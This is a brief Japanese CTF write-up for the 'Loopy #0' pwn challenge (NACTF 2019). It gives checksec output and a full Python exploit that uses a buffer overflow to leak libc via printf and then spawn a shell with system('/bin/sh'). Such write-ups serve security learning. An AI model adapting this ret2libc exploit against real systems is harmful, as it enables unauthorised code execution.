# [pwn 350pts] Loopy #0 - Network Academia CTF 2019
32ビットバイナリで、NX以外無効です。
```
$ checksec -f loopy-0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68 Symbols     No       0               4       loopy-0
```

BOFがあるのでlibc leakしてシェルを取るだけです。
なんかローカルだとバイナリが動きませんが、この程度なら動かさなくてもexploitコードが書けるので問題なしです。
```
from ptrlib import *

elf = ELF("./loopy-0")
libc = ELF("./libc.so.6")
sock = Socket("shell.2019.nactf.com", 31283)
payload = b'A' * 0x4c
payload += p32(elf.plt("printf"))
payload += p32(elf.symbol("vuln"))
payload += p32(elf.got("printf"))
sock.sendlineafter(">", payload)

sock.recvuntil(": ")
libc_base = u32(sock.recv()[len(payload):len(payload) + 4]) - libc.symbol("printf")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x4c
payload += p32(libc_base + libc.symbol("system"))
payload += p32(libc_base + libc.symbol("exit"))
payload += p32(libc_base + next(libc.find("/bin/sh")))
sock.sendline(payload)

sock.interactive()
```

# 感想
簡単ですね。
